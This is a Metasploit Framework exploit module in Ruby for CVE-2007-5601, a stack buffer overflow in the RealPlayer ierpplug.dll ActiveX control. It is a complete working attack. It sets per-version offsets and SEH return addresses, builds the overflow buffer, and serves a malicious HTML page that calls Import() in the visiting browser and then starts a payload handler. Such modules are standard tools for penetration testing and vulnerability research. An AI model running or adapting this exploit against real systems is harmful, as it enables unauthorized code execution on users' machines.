##
# $Id: realplayer_import.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'RealPlayer ierpplug.dll ActiveX Control Playlist Name Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in RealOne Player V2 Gold Build 6.0.11.853 and
				RealPlayer 10.5 Build 6.0.12.1483. By sending an overly long string to the "Import()"
				method, an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2007-5601' ],
					[ 'OSVDB', '41430' ],
					[ 'BID', '26130' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'IE / RealOne Player 2 (6.0.11.853)',     { 'Offset' => 4756, 'Ret' => 0x601aa72b } ], #rpmn3260.dll (6.0.9.1419)
					[ 'IE / RealPlayer 10.5 (6.0.12.1483)',     { 'Offset' => 4768, 'Ret' => 0x614bd13b } ], #rpmn3260.dll (6.0.9.2934)
				],
			'DisclosureDate' => 'Oct 18 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
			false
	end

	def check_dependencies
			use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)

		# Set the exploit buffer
		filler = rand_text_english(target['Offset'])
		seh    = generate_seh_payload(target.ret)
		sploit = filler + seh + rand_text_english(30724 - payload.encoded.length)

		# [id(0x60020009), helpstring("Imports a file to RealPlayer's Media Library")]
		# long Import(
		#                 [in] BSTR file,
		#                 [in, optional, defaultvalue("")] BSTR playlist,
		#                 [in, optional, defaultvalue("")] BSTR clipInfo,
		#                 [in, optional, defaultvalue(0)] long bPlayFile,
		#                 [in, optional, defaultvalue(0)] long bCopyToMyMusic);

		# Build out the message
		content = %Q|
			<html>
			<object classid='clsid:FDC7A535-4070-4B92-A0EA-D9994BCC0DC5' id='#{vname}'></object>
			<script language='javascript'>
			var #{vname} = document.getElementById('#{vname}');
			var #{strname} = new String('#{sploit}');
			#{vname}.Import("Firstrun\\\\audio.rm" ,#{strname} ,"" ,0 ,0);
			</script>
			</html>
			|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end